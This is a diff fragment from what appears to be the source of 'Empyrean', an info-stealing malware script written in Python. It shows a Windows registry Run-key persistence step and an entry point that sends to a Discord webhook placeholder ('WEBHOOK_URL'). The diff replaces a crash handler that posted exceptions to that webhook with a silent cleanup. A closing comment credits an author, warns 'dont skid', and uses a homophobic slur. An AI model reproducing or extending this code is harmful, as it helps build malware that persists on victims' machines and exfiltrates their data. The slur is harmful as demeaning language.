@@ -606,14 +606,11 @@ class startup():
         subprocess.call(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/f"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-def crash_handler(webhook: str, exception: Exception):
-    Webhook.from_url(webhook, adapter=RequestsWebhookAdapter()).send(content=exception, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
-    
 if __name__ == "__main__":
-    try:
-        main("WEBHOOK_URL")
+    try: main("WEBHOOK_URL")
     except Exception as e:
-        crash_handler("WEBHOOK_URL", e)
+        try: cleanup()
+        except: exit() 
         
 # 600 lines of gay code made by https://github.com/addi00000
 # dont skid :)
